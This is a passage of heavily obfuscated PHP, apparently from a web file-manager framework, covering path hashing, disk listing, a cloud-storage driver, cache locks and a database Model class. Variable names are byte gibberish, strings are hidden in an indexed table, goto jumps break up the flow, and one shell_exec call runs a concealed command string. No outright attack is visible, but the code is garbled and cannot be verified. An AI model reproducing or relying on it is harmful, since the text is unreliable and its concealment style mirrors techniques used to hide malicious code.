$à‰–÷ç[$Œ¶€œ§] = -1; break; } $à‰–÷ç[$Œ¶€œ§] = -1; $à‰–÷ç[$¤ÜÕşÈ†] = -1; break; } } $âëé×ÚŸ = array(); foreach ($à‰–÷ç as $•ˆŞÅ±å) { if ($•ˆŞÅ±å !== -1) { $âëé×ÚŸ[] = $•ˆŞÅ±å; } } $½ÂşêÇÜ = implode($á®¹íèñ[8], $âëé×ÚŸ); if (strpos($½ÂşêÇÜ, $á®¹íèñ[1358]) === 0) { $½ÂşêÇÜ = $á®¹íèñ[1354] . substr($½ÂşêÇÜ, strlen($á®¹íèñ[1358])); } return $½ÂşêÇÜ; } public static function pathUrlClear($ÁÑË«“Õ) { $¦ö“Š„ =& $_SERVER[÷åé¼î]; if (!$ÁÑË«“Õ) { return $ÁÑË«“Õ; } $ÁÑË«“Õ = rawurldecode($ÁÑË«“Õ); $ÁÑË«“Õ = str_replace($¦ö“Š„[1356], $¦ö“Š„[8], $ÁÑË«“Õ); if (strpos($ÁÑË«“Õ, $¦ö“Š„[76]) > 0) { $ÁÑË«“Õ = substr($ÁÑË«“Õ, 0, strpos($ÁÑË«“Õ, $¦ö“Š„[76])); } if (strpos($ÁÑË«“Õ, $¦ö“Š„[1359]) > 0) { $ÁÑË«“Õ = substr($ÁÑË«“Õ, 0, strpos($ÁÑË«“Õ, $¦ö“Š„[1359])); } return $ÁÑË«“Õ; } public static function sourceID($¼ûâòÄ¤) { $±¢×Ê¦ =& $_SERVER[÷åé¼î]; $…˜Ã¨¾ = self::parse($¼ûâòÄ¤); if ($…˜Ã¨¾[$±¢×Ê¦[33]] !== self::KOD_SOURCE) { show_json(LNG($±¢×Ê¦[1360]), !1); } return $…˜Ã¨¾[$±¢×Ê¦[459]]; } public static function make($Î«ÁÙø) { if (!$Î«ÁÙø) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Î«ÁÙø)); } public static function makeShare($…ìŠ·Çê, $æ”“¤½¿) { return self::makePath(self::KOD_SHARE_ITEM, $…ìŠ·Çê, $æ”“¤½¿); } public static function makeFileTypePath($Ø¸¢üªÌ) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ø¸¢üªÌ); } public static function makeFileTagPath($²êü´úµ) { return self::makePath(self::KOD_USER_FILE_TAG, $²êü´úµ); } public static function makePath($ØİÜğÈ±, $˜ƒ…§íÜ = '', $ûÎòûæ• = '') { $¡• ÑÌß =& $_SERVER[÷åé¼î]; $¹ Ûíä‡ = substr($ØİÜğÈ±, 1, -1); $íÄ×“¸÷ = $¡• ÑÌß[1361] . $¹ Ûíä‡ . $¡• ÑÌß[1362] . $˜ƒ…§íÜ . $¡• ÑÌß[1363]; $íÄ×“¸÷ = $ûÎòûæ• ? $íÄ×“¸÷ . $ûÎòûæ• . $¡• ÑÌß[8] : $íÄ×“¸÷; return $íÄ×“¸÷; } public static function hashPath($Á­ô­ƒº, $Ö¡¥Ó‰ù = true) { $±úƒ–åË =& $_SERVER[÷åé¼î]; $´ÒÑáşÄ = is_array($Á­ô­ƒº) ? $Á­ô­ƒº : IO::info($Á­ô­ƒº); $Ì²ğ³ğ = _get($´ÒÑáşÄ, $±úƒ–åË[1364], $±úƒ–åË[12]); if (!$Ì²ğ³ğ && isset($´ÒÑáşÄ[$±úƒ–åË[235]])) { $Ì²ğ³ğ = trim($´ÒÑáşÄ[$±úƒ–åË[235]], $±úƒ–åË[121]); } if (!$Ì²ğ³ğ && isset($´ÒÑáşÄ[$±úƒ–åË[193]]) && $´ÒÑáşÄ[$±úƒ–åË[193]]) { $´ÒÑáşÄ = IO::info(KodIO::make($´ÒÑáşÄ[$±úƒ–åË[193]])); $Ì²ğ³ğ = _get($´ÒÑáşÄ, $±úƒ–åË[1364], $±úƒ–åË[12]); } $¦èş˜³ì = md5($´ÒÑáşÄ[$±úƒ–åË[87]] . $´ÒÑáşÄ[$±úƒ–åË[79]] . $´ÒÑáşÄ[$±úƒ–åË[88]]); if (!$Ì²ğ³ğ && file_exists($´ÒÑáşÄ[$±úƒ–åË[87]])) { $Ì²ğ³ğ = Cache::get($¦èş˜³ì . $±úƒ–åË[1365]); $Ì²ğ³ğ = !1; if (!$Ì²ğ³ğ) { $Ì²ğ³ğ = IO::hashSimple($´ÒÑáşÄ[$±úƒ–åË[87]]); Cache::set($¦èş˜³ì . $±úƒ–åË[1365], $Ì²ğ³ğ, 3600 * 24 * 30); } } if ($Ö¡¥Ó‰ù && !$Ì²ğ³ğ) { } return $Ì²ğ³ğ ? $Ì²ğ³ğ : $¦èş˜³ì; } public static function hashPathSafe($ÜŒÔı‡€, $†è‰¥ … = true) { $Ô¸ŸŸ =& $_SERVER[÷åé¼î]; $êÄŒ†¢° = self::hashPath($ÜŒÔı‡€, $†è‰¥ …); return md5($êÄŒ†¢° . $Ô¸ŸŸ[1366] . Model($Ô¸ŸŸ[835])->get($Ô¸ŸŸ[836])); } public static function initSystemPath() { $ŸŞ¸ÛŠş =& $_SERVER[÷åé¼î]; if (defined($ŸŞ¸ÛŠş[1367])) { return; } define($ŸŞ¸ÛŠş[1367], self::systemPath($ŸŞ¸ÛŠş[191])); define($ŸŞ¸ÛŠş[1368], self::systemPath($ŸŞ¸ÛŠş[1369])); define($ŸŞ¸ÛŠş[1370], self::systemPath($ŸŞ¸ÛŠş[1371])); define($ŸŞ¸ÛŠş[1372], self::systemPath($ŸŞ¸ÛŠş[1373])); IOHistory::bindEvent(); } public static function systemPath($îö•ú¶) { $Ó¶›Ø‡ =& $_SERVER[÷åé¼î]; $ÛÏ¨¨Ò¢ = $Ó¶›Ø‡[1374] . ucfirst($îö•ú¶); $·¬Î´¥¼ = Model($Ó¶›Ø‡[835])->get($ÛÏ¨¨Ò¢); if ($·¬Î´¥¼) { return $·¬Î´¥¼; } if ($îö•ú¶ == $Ó¶›Ø‡[191]) { $·¬Î´¥¼ = self::make(Model($Ó¶›Ø‡[889])->systemRootPathAdd($Ó¶›Ø‡[589])); } else { $·¬Î´¥¼ = self::systemPath($Ó¶›Ø‡[191]); $©ÌüĞÏ¬ = self::sourceID($·¬Î´¥¼); $·¬Î´¥¼ = self::make(Model($Ó¶›Ø‡[889])->mkdir($©ÌüĞÏ¬, $îö•ú¶)); } Model($Ó¶›Ø‡[835])->set($ÛÏ¨¨Ò¢, $·¬Î´¥¼); return $·¬Î´¥¼; } public static function systemFolder($¤ä»ûš¬) { $áá÷éàÕ = IO_PATH_SYSTEM_SOURCE . $¤ä»ûš¬; $Í¥Œ¼éô = Cache::get($áá÷éàÕ); if (!$Í¥Œ¼éô) { $Ñ ¥Ú®ı = IO::infoFullSimple($áá÷éàÕ); if (!$Ñ ¥Ú®ı) { $Í¥Œ¼éô = IO::mkdir($áá÷éàÕ, REPEAT_SKIP); } else { $Í¥Œ¼éô = $Ñ ¥Ú®ı[$_SERVER[÷åé¼î][87]]; } Cache::set($áá÷éàÕ, $Í¥Œ¼éô, 3600 * 10); } return $Í¥Œ¼éô; } public static function defaultDriver() { return Model($_SERVER[÷åé¼î][832])->defaultDriver(); } public static function defaultIO() { $áÆ»ë×Ÿ =& $_SERVER[÷åé¼î]; $ªº·›õ÷ = self::defaultDriver(); return $áÆ»ë×Ÿ[1375] . $ªº·›õ÷[$áÆ»ë×Ÿ[459]] . $áÆ»ë×Ÿ[1363]; } public static function defaultDriverInit() { static $°µâéÙ = false; if ($°µâéÙ) { return $°µâéÙ; } $°µâéÙ = IO::init(self::defaultIO()); return $°µâéÙ; } public static function fileTypeList() { $ëêëñŠ =& $_SERVER[÷åé¼î]; $»“§µ¯Ú = $GLOBALS[$ëêëñŠ[6]][$ëêëñŠ[1376]]; foreach ($»“§µ¯Ú as $¿­ë³’ó => $ÒË€îúæ) { $Œëæ„Ğ = $ëêëñŠ[1377] . $¿­ë³’ó; $·”ª­°Ô = LNG($Œëæ„Ğ); if ($Œëæ„Ğ != $·”ª­°Ô) { $»“§µ¯Ú[$¿­ë³’ó][$ëêëñŠ[32]] = $·”ª­°Ô; } } return $»“§µ¯Ú; } public static function diskList($¹‰¥È´á = true) { $àŞÒ•ˆÕ = $_SERVER[÷åé¼î][1378]; if ($¹‰¥È´á) { $™“á¦² = Cache::get($àŞÒ•ˆÕ); if (is_array($™“á¦²)) { return $™“á¦²; } } $™“á¦² = self::diskListGet(); Cache::set($àŞÒ•ˆÕ, $™“á¦², 60); return $™“á¦²; } public static function diskListGet() { $ÇÒÈÛÊ‚ =& $_SERVER[÷åé¼î]; $ƒ£´ğÀú = array(); if ($GLOBALS[$ÇÒÈÛÊ‚[6]][$ÇÒÈÛÊ‚[1379]] == $ÇÒÈÛÊ‚[1380]) { $¸ˆôâ†» = $ÇÒÈÛÊ‚[1381]; for ($Ø÷Ô‡ = 0; $Ø÷Ô‡ < strlen($¸ˆôâ†»); $Ø÷Ô‡++) { $î‡­±é™ = $¸ˆôâ†»[$Ø÷Ô‡] . $ÇÒÈÛÊ‚[1382]; if (file_exists($î‡­±é™)) { $ƒ£´ğÀú[] = $î‡­±é™; } } return $ƒ£´ğÀú; } if (!function_exists($ÇÒÈÛÊ‚[101])) { $ƒ£´ğÀú[] = $ÇÒÈÛÊ‚[900]; return $ƒ£´ğÀú; } $…îşĞ»¥ = explode($ÇÒÈÛÊ‚[262], shell_exec($ÇÒÈÛÊ‚[1383])); array_shift($…îşĞ»¥); array_pop($…îşĞ»¥); $„‡³ÆîÖ = array($ÇÒÈÛÊ‚[1384], $ÇÒÈÛÊ‚[1385], $ÇÒÈÛÊ‚[1386], $ÇÒÈÛÊ‚[1387], $ÇÒÈÛÊ‚[1388], $ÇÒÈÛÊ‚[1389], $ÇÒÈÛÊ‚[1390], $ÇÒÈÛÊ‚[1391]); foreach ($…îşĞ»¥ as $øÄ‡¯²Ï) { $ªúôƒ¼« = preg_split($ÇÒÈÛÊ‚[1392], $øÄ‡¯²Ï); $î‡­±é™ = $ªúôƒ¼«[count($ªúôƒ¼«) - 1]; if (!strstr($ªúôƒ¼«[0], $ÇÒÈÛÊ‚[1393]) || !$î‡­±é™) { continue; } $’âµ©˜¦ = rtrim($î‡­±é™, $ÇÒÈÛÊ‚[8]) . $ÇÒÈÛÊ‚[8]; if (in_array($’âµ©˜¦, $„‡³ÆîÖ)) { continue; } $ƒ£´ğÀú[] = $’âµ©˜¦; } return $ƒ£´ğÀú; } public static function isSameDisk($æ„ÓË“š, $Ÿ¦‚­öÏ) { $Ûî¸Ø¿ =& $_SERVER[÷åé¼î]; if ($GLOBALS[$Ûî¸Ø¿[6]][$Ûî¸Ø¿[1379]] == $Ûî¸Ø¿[1380]) { return strtolower(substr($æ„ÓË“š, 0, 1)) == strtolower(substr($Ÿ¦‚­öÏ, 0, 1)); } $ü¹ªŒ‡Í = self::diskList(); $É¼Õ¹Ê = !1; $Óî²Ë„’ = !1; sort($ü¹ªŒ‡Í); $ü¹ªŒ‡Í = array_reverse($ü¹ªŒ‡Í); $æ„ÓË“š = rtrim($æ„ÓË“š, $Ûî¸Ø¿[8]) . $Ûî¸Ø¿[8]; $Ÿ¦‚­öÏ = rtrim($Ÿ¦‚­öÏ, $Ûî¸Ø¿[8]) . $Ûî¸Ø¿[8]; foreach ($ü¹ªŒ‡Í as $¡À“¾ûƒ) { $ùöóøŠÊ = strlen($¡À“¾ûƒ); if (!$É¼Õ¹Ê && substr($æ„ÓË“š, 0, $ùöóøŠÊ) == $¡À“¾ûƒ) { $É¼Õ¹Ê = $¡À“¾ûƒ; } if (!$Óî²Ë„’ && substr($Ÿ¦‚­öÏ, 0, $ùöóøŠÊ) == $¡À“¾ûƒ) { $Óî²Ë„’ = $¡À“¾ûƒ; } if ($É¼Õ¹Ê && $Óî²Ë„’) { break; } } return $É¼Õ¹Ê === $Óî²Ë„’; } public static function transferType($£ªÙ´•Õ, $ÏüòÜ²½) { $è‘ŞÏˆã =& $_SERVER[÷åé¼î]; $ë¶’Ğ = self::driverType($£ªÙ´•Õ); $¯¨­¨áì = self::driverType($ÏüòÜ²½); if ($ë¶’Ğ[$è‘ŞÏˆã[33]] == $¯¨­¨áì[$è‘ŞÏˆã[33]] && $ë¶’Ğ[$è‘ŞÏˆã[1394]] == $¯¨­¨áì[$è‘ŞÏˆã[1394]]) { return $è‘ŞÏˆã[1395]; } if ($ë¶’Ğ[$è‘ŞÏˆã[33]] == $è‘ŞÏˆã[941] && $¯¨­¨áì[$è‘ŞÏˆã[33]] == $è‘ŞÏˆã[109]) { return $è‘ŞÏˆã[1273]; } if ($ë¶’Ğ[$è‘ŞÏˆã[33]] == $è‘ŞÏˆã[109] && $¯¨­¨áì[$è‘ŞÏˆã[33]] == $è‘ŞÏˆã[941]) { return $è‘ŞÏˆã[110]; } return $è‘ŞÏˆã[1396]; } public static function driverType($…ìÔ­) { $òôµÑ¥ =& $_SERVER[÷åé¼î]; $Õ‚½ñš‹ = str_replace($òôµÑ¥[1397], $òôµÑ¥[12], strtolower($…ìÔ­->getType())); if ($Õ‚½ñš‹ == $òôµÑ¥[822] || $Õ‚½ñš‹ == $òôµÑ¥[1398] || $Õ‚½ñš‹ == $òôµÑ¥[1399]) { $…ìÔ­ = self::defaultDriverInit(); } else { if ($Õ‚½ñš‹ == $òôµÑ¥[1283] || $Õ‚½ñš‹ == $òôµÑ¥[1400]) { $…ìÔ­ = IO::init($…ìÔ­->pathParse[$òôµÑ¥[1226]]); } } $’—–«Ò“ = $…ìÔ­->path; $Õ‚½ñš‹ = str_replace($òôµÑ¥[1397], $òôµÑ¥[12], strtolower($…ìÔ­->getType())); if ($Õ‚½ñš‹ == $òôµÑ¥[109]) { return array($òôµÑ¥[33] => $òôµÑ¥[109], $òôµÑ¥[1394] => $òôµÑ¥[12], $òôµÑ¥[87] => $’—–«Ò“, $òôµÑ¥[98] => $…ìÔ­); } return array($òôµÑ¥[33] => $òôµÑ¥[941], $òôµÑ¥[1394] => $…ìÔ­->pathDriver, $òôµÑ¥[87] => $’—–«Ò“, $òôµÑ¥[98] => $…ìÔ­); } public static function pathDriverType($ÛŸ¨¹Ö) { return $ÛŸ¨¹Ö ? self::driverType(IO::init($ÛŸ¨¹Ö)) : !1; } public static function pathDriverLocal($…Êø›œ«) { $»÷ñ¦‘å =& $_SERVER[÷åé¼î]; $îÙŠµÚ® = $…Êø›œ« ? self::driverType(IO::init($…Êø›œ«)) : !1; return $îÙŠµÚ®[$»÷ñ¦‘å[33]] == $»÷ñ¦‘å[109] ? !0 : !1; } public static function allowCover($Ó½‹¡ƒı, $¦›ÒŠÑ = true) { $¹ĞÊäÔƒ =& $_SERVER[÷åé¼î]; if (is_string($Ó½‹¡ƒı)) { $Ó½‹¡ƒı = IO::info($Ó½‹¡ƒı); } if (!$Ó½‹¡ƒı || $Ó½‹¡ƒı[$¹ĞÊäÔƒ[33]] == $¹ĞÊäÔƒ[78] || $Ó½‹¡ƒı[$¹ĞÊäÔƒ[79]] <= 100) { return !1; } if (isset($Ó½‹¡ƒı[$¹ĞÊäÔƒ[1401]]) || !$Ó½‹¡ƒı[$¹ĞÊäÔƒ[87]]) { return !1; } if (isset($Ó½‹¡ƒı[$¹ĞÊäÔƒ[232]]) && !$Ó½‹¡ƒı[$¹ĞÊäÔƒ[232]]) { return !1; } static $®ô­Äâ = false; if (!$®ô­Äâ || !$¦›ÒŠÑ) { $÷µ‡æ»Û = self::driverType(IO::init($Ó½‹¡ƒı[$¹ĞÊäÔƒ[87]])); $×—ŞÈ£´ = $÷µ‡æ»Û[$¹ĞÊäÔƒ[98]]; $®ô­Äâ = $¹ĞÊäÔƒ[196]; if ($÷µ‡æ»Û[$¹ĞÊäÔƒ[33]] == $¹ĞÊäÔƒ[109]) { $®ô­Äâ = $¹ĞÊäÔƒ[1402]; } if ($÷µ‡æ»Û[$¹ĞÊäÔƒ[98]] && is_array($÷µ‡æ»Û[$¹ĞÊäÔƒ[98]]->config)) { $÷Ğ„Ñ‡ù = $÷µ‡æ»Û[$¹ĞÊäÔƒ[98]]->config; if (isset($÷Ğ„Ñ‡ù[$¹ĞÊäÔƒ[1403]]) && $÷Ğ„Ñ‡ù[$¹ĞÊäÔƒ[1403]]) { $®ô­Äâ = $¹ĞÊäÔƒ[1402]; } } } return $®ô­Äâ == $¹ĞÊäÔƒ[1402] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ÔšáÙà÷) { parent::__construct($ÔšáÙà÷); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($À¸À·“Û) { $òÆ°ãŒµ =& $_SERVER[÷åé¼î]; if (substr($À¸À·“Û, 0, 7) == $òÆ°ãŒµ[1404]) { $À¸À·“Û = $òÆ°ãŒµ[1405] . substr($À¸À·“Û, 7); } header($òÆ°ãŒµ[175] . $À¸À·“Û); die; } } goto côİ¯›Ã; B„ªñÖ: class CacheLockRedis { public function lock($¡ı¢Æ³à, $êçºí¯Ë = 10) { $¿•áò”• = Cache::init(); $‹Åæ ±ß = microtime(!0) + $êçºí¯Ë; while (microtime(!0) < $‹Åæ ±ß) { $“Ÿ—†Æğ = $¿•áò”•->get($¡ı¢Æ³à); if (!$“Ÿ—†Æğ) { $–øƒºÌ” = $¿•áò”•->setLock($¡ı¢Æ³à, $‹Åæ ±ß, $êçºí¯Ë); if ($–øƒºÌ”) { return !0; } } else { if ($“Ÿ—†Æğ < microtime(!0)) { $¿•áò”•->set($¡ı¢Æ³à, $‹Åæ ±ß, $êçºí¯Ë * 2); if ($¿•áò”•->get($¡ı¢Æ³à) === $“Ÿ—†Æğ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ûé«§ÜÑ) { return Cache::init()->get($Ûé«§ÜÑ); } public function unlock($¹çÅ¡¹é) { return Cache::init()->remove($¹çÅ¡¹é); } } class CacheLockMemcached { public function lock($õ©ç´£ı, $† òÑë² = 0) { $‘Û·™« = Cache::init(); $ŞÎ‰²°‘ = microtime(!0) + $† òÑë²; while (microtime(!0) < $ŞÎ‰²°‘) { $Óƒ¯›ê” = $‘Û·™«->get($õ©ç´£ı); if (!$Óƒ¯›ê” || $Óƒ¯›ê” < microtime(!0)) { $œØ­´š× = $‘Û·™«->handle->add($õ©ç´£ı, $ŞÎ‰²°‘, $† òÑë²); if ($œØ­´š×) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ææà„•£) { return Cache::init()->get($Ææà„•£); } public function unlock($¸·è¡ş) { return Cache::init()->remove($¸·è¡ş); } } $_file = $_SERVER[$_SERVER[÷åé¼î][931]]; goto fÀšÁ¥÷Ğ; cç´ê‚Û›·: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\x65", "\157\x72\x64\145\x72", "\x61\x6c\151\x61\x73", "\150\141\166\151\156\x67", "\147\x72\157\x75\x70", "\154\157\143\153", "\144\151\163\x74\151\156\143\x74", "\x61\165\x74\x6f", "\x66\151\x6c\x74\145\162", "\x76\x61\x6c\x69\144\141\164\145", "\x72\x65\163\x75\154\164", "\142\x69\156\144", "\x74\157\153\145\x6e"); public function __construct($óæá¬«² = '', $í¥‰ŠÚÌ = '', $Êá–Ëá· = '') { $Ÿ§¯“ùÔ =& $_SERVER[÷åé¼î]; $this->_initialize(); if (!empty($óæá¬«²)) { if (strpos($óæá¬«², $Ÿ§¯“ùÔ[10])) { list($this->dbName, $this->name) = explode($Ÿ§¯“ùÔ[10], $óæá¬«²); } else { $this->name = $óæá¬«²; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($í¥‰ŠÚÌ)) { $this->tablePrefix = $Ÿ§¯“ùÔ[12]; } elseif ($Ÿ§¯“ùÔ[12] != $í¥‰ŠÚÌ) { $this->tablePrefix = $í¥‰ŠÚÌ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Ÿ§¯“ùÔ[305]); } $this->db(0, empty($this->connection) ? $Êá–Ëá· : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ªÛ––˜ =& $_SERVER[÷åé¼î]; if (empty($this->fields)) { if (think_config($ªÛ––˜[306])) { $ƒëùİ ï = $this->dbName ? $this->dbName : think_config($ªÛ––˜[307]); $Ç†à”íÑ = think_var_cache($ªÛ––˜[308] . strtolower(get_path_this($ƒëùİ ï) . $ªÛ––˜[10] . $this->name)); if ($Ç†à”íÑ) { $üÉùÛŠÕ = think_config($ªÛ––˜[309]); if (empty($üÉùÛŠÕ) || $Ç†à”íÑ[$ªÛ––˜[310]] == $üÉùÛŠÕ) { $this->fields = $Ç†à”íÑ; return; } } } $this->flush(); } } public function flush() { $­ó Õåà =& $_SERVER[÷åé¼î]; $this->db->setModel($this->name); $ ó±ˆ¿ = $this->db->getFields($this->getTableName()); if (!$ ó±ˆ¿) { return !1; } $this->fields = array_keys($ ó±ˆ¿); $this->fields[$­ó Õåà[311]] = !1; foreach ($ ó±ˆ¿ as $Ä½ËÃ© => $—öšê„™) { $Ü›çŒ—[$Ä½ËÃ©] = $—öšê„™[$­ó Õåà[33]]; if ($—öšê„™[$­ó Õåà[39]]) { $this->fields[$­ó Õåà[312]] = $Ä½ËÃ©; if ($—öšê„™[$­ó Õåà[42]]) { $this->fields[$­ó Õåà[311]] = !0; } } } $this->fields[$­ó Õåà[313]] = $Ü›çŒ—; if (think_config($­ó Õåà[309])) { $this->fields[$­ó Õåà[310]] = think_config($­ó Õåà[309]); } if (think_config($­ó Õåà[306])) { $¦¾¬äÖø = $this->dbName ? $this->dbName : think_config($­ó Õåà[307]); think_var_cache($­ó Õåà[308] . strtolower(get_path_this($¦¾¬äÖø) . $­ó Õåà[10] . $this->name), $this->fields); } } public function switchModel($òÒ™Ù›Á, $Ó²¨Æõ¡ = array()) { $¡û¥ÊÅã =& $_SERVER[÷åé¼î]; $Ñ‰Ÿ¾ç¨ = ucwords(strtolower($òÒ™Ù›Á)) . $¡û¥ÊÅã[314]; if (!class_exists($Ñ‰Ÿ¾ç¨)) { think_exception($Ñ‰Ÿ¾ç¨ . think_lang($¡û¥ÊÅã[315])); } $this->_extModel = new $Ñ‰Ÿ¾ç¨($this->name); if (!empty($Ó²¨Æõ¡)) { foreach ($Ó²¨Æõ¡ as $ÎÎËÖ†·) { $this->_extModel->setProperty($ÎÎËÖ†·, $this->{$ÎÎËÖ†·}); } } return $this->_extModel; } public function __set($ç“’«Èñ, $˜•©‡ş) { $this->data[$ç“’«Èñ] = $˜•©‡ş; } public function __get($±âÏøí) { return isset($this->data[$±âÏøí]) ? $this->data[$±âÏøí] : null; } public function __isset($®•£»¨À) { return isset($this->data[$®•£»¨À]); } public function __unset($©ó¯ÕĞ¥) { unset($this->data[$©ó¯ÕĞ¥]); } public function __call($÷”é÷â–, $Œ•Ê“å) { $íÙÎÈ£˜ =& $_SERVER[÷åé¼î]; if (in_array(strtolower($÷”é÷â–), $this->methods, !0)) { $this->options[strtolower($÷”é÷â–)] = $Œ•Ê“å[0]; return $this; } elseif (in_array(strtolower($÷”é÷â–), array($íÙÎÈ£˜[316], $íÙÎÈ£˜[317], $íÙÎÈ£˜[318], $íÙÎÈ£˜[319], $íÙÎÈ£˜[320]), !0)) { $ÃõÍ§— = isset($Œ•Ê“å[0]) ? $Œ•Ê“å[0] : $íÙÎÈ£˜[220]; $ÃõÍ§— = $this->db->parseKey($ÃõÍ§—); return $this->getField(strtoupper($÷”é÷â–) . $íÙÎÈ£˜[321] . $ÃõÍ§— . $íÙÎÈ£˜[322] . $÷”é÷â–, $íÙÎÈ£˜[316]); } elseif (strtolower(substr($÷”é÷â–, 0, 5)) == $íÙÎÈ£˜[323]) { $ÃõÍ§— = think_parse_name(substr($÷”é÷â–, 5)); $Ë¹í‹Ô€[$ÃõÍ§—] = $Œ•Ê“å[0]; return $this->where($Ë¹í‹Ô€)->find(); } elseif (strtolower(substr($÷”é÷â–, 0, 10)) == $íÙÎÈ£˜[324]) { $Ï’ãìˆŞ = think_parse_name(substr($÷”é÷â–, 10)); $Ë¹í‹Ô€[$Ï’ãìˆŞ] = $Œ•Ê“å[0]; return $this->where($Ë¹í‹Ô€)->getField($Œ•Ê“å[1]); } elseif (isset($this->_scope[$÷”é÷â–])) { return $this->scope($÷”é÷â–, $Œ•Ê“å[0]); } elseif (method_exists($this, $÷”é÷â–)) { array_unshift($Œ•Ê“å, $÷”é÷â–); return call_user_func_array(array($this, $íÙÎÈ£˜[325]), $Œ•Ê“å); } else { return call_user_func_array(array(parent, $÷”é÷â–), $Œ•Ê“å); } } protected function call() { $Õ¬éÎìí =& $_SERVER[÷åé¼î]; $ä«ºÆê = func_get_args(); $ÚÊìĞá” = array_shift($ä«ºÆê); $Œõİ·õŒ = $ÚÊìĞá”; if (is_array($ÚÊìĞá”)) { $Œõİ·õŒ = $ÚÊìĞá”[1]; $ÚÊìĞá” = $ÚÊìĞá”[0]; } $óÖ–Şô  = count($ä«ºÆê) - 1; if (isset($ä«ºÆê[$óÖ–Şô ]) && $ä«ºÆê[$óÖ–Şô ] === $ÚÊìĞá”) { think_exception(__CLASS__ . $Õ¬éÎìí[4] . $ÚÊìĞá” . think_lang($Õ¬éÎìí[326])); return; } $ä«ºÆê[] = $ÚÊìĞá”; if (method_exists($this, $Õ¬éÎìí[327])) { $çÇ›¿Ş„ = call_user_func_array(array($this, $Õ¬éÎìí[328]), array($Œõİ·õŒ, $ä«ºÆê)); if (!is_null($çÇ›¿Ş„) && $çÇ›¿Ş„ !== !1) { return $çÇ›¿Ş„; } } $ èƒ±ÑÛ = call_user_func_array(array($this, $ÚÊìĞá”), $ä«ºÆê); if (method_exists($this, $Õ¬éÎìí[329])) { $çÇ›¿Ş„ = call_user_func_array(array($this, $Õ¬éÎìí[330]), array($Œõİ·õŒ, $ä«ºÆê, $ èƒ±ÑÛ)); if ($çÇ›¿Ş„) { return $çÇ›¿Ş„; } } return $ èƒ±ÑÛ; } protected function _initialize() { } protected function _facade($ğ°€ƒ¹µ) { $¹Ô«—ÂÆ =& $_SERVER[÷åé¼î]; if (!empty($this->fields)) { foreach ($ğ°€ƒ¹µ as $‡Ñ¯ó€Ú => $£àÏ™Ş¼) { if (is_array($this->fields) && !in_array($‡Ñ¯ó€Ú, $this->fields, !0)) { unset($ğ°€ƒ¹µ[$‡Ñ¯ó€Ú]); } elseif (is_scalar($£àÏ™Ş¼)) { $this->_parseType($ğ°€ƒ¹µ, $‡Ñ¯ó€Ú); } } } if (!empty($this->options[$¹Ô«—ÂÆ[331]])) { $ğ°€ƒ¹µ = array_map($this->options[$¹Ô«—ÂÆ[331]], $ğ°€ƒ¹µ); unset($this->options[$¹Ô«—ÂÆ[331]]); } $this->_beforeWrite($ğ°€ƒ¹µ); return $ğ°€ƒ¹µ; } protected function _beforeWrite(&$”Íœ¤åÑ) { } public function add($¢ÕŞÜ¦ = '', $İ†îş¤ = array(), $Ğ®ÄĞ³¶ = false) { if (empty($¢ÕŞÜ¦)) { if (!empty($this->data)) { $¢ÕŞÜ¦ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[÷åé¼î][332]); return !1; } } $İ†îş¤ = $this->_parseOptions($İ†îş¤); $¢ÕŞÜ¦ = $this->_facade($¢ÕŞÜ¦); if (!1 === $this->_beforeInsert($¢ÕŞÜ¦, $İ†îş¤)) { return !1; } $ÏÂ˜«¿ö = $this->db->insert($¢ÕŞÜ¦, $İ†îş¤, $Ğ®ÄĞ³¶); if (!1 !== $ÏÂ˜«¿ö) { $ë¿ºìış = $this->getLastInsID(); if ($ë¿ºìış) { $¢ÕŞÜ¦[$this->getPk()] = $ë¿ºìış; $this->_after_insert($¢ÕŞÜ¦, $İ†îş¤); return $ë¿ºìış; } $this->_after_insert($¢ÕŞÜ¦, $İ†îş¤); } return $ÏÂ˜«¿ö; } protected function _beforeInsert(&$Üµã´Èœ, $¾¬ˆƒ™) { } protected function _after_insert($£éúÆ†, $¨”ñöÛş) { } public function addAll($¿Ïñùçè, $‡Òé»°˜ = array(), $½„Ïøá÷ = false) { $©ÃéµßÒ =& $_SERVER[÷åé¼î]; if (empty($¿Ïñùçè)) { $this->error = think_lang($©ÃéµßÒ[332]); return !1; } $‡Òé»°˜ = $this->_parseOptions($‡Òé»°˜); foreach ($¿Ïñùçè as $ª¼èÄÚş => $ÌÁ›Ã÷) { $¿Ïñùçè[$ª¼èÄÚş] = $this->_facade($ÌÁ›Ã÷); } if (method_exists($this->db, $©ÃéµßÒ[333])) { $¥¾Íƒ£ = $this->db->insertAll($¿Ïñùçè, $‡Òé»°˜, $½„Ïøá÷); } else { $this->startTrans(); foreach ($¿Ïñùçè as $ª¼èÄÚş => $ÌÁ›Ã÷) { $¥¾Íƒ£ = $this->db->insert($ÌÁ›Ã÷, $‡Òé»°˜, $½„Ïøá÷); } $this->commit(); } if (!1 !== $¥¾Íƒ£) { $ğİÕ°éÄ = $this->getLastInsID(); if ($ğİÕ°éÄ) { return $ğİÕ°éÄ; } } return $¥¾Íƒ£; } public function selectAdd($‰Ó °åÃ = '', $êÉíıÄ = '', $Œ÷õ‰¨Ì = array()) { $ø—»–¼ =& $_SERVER[÷åé¼î]; $Œ÷õ‰¨Ì = $this->_parseOptions($Œ÷õ‰¨Ì); if (!1 === ($¿‡†ÓÄÌ = $this->db->selectInsert($‰Ó °åÃ ? $‰Ó °åÃ : $Œ÷õ‰¨Ì[$ø—»–¼[334]], $êÉíıÄ ? $êÉíıÄ : $this->getTableName(), 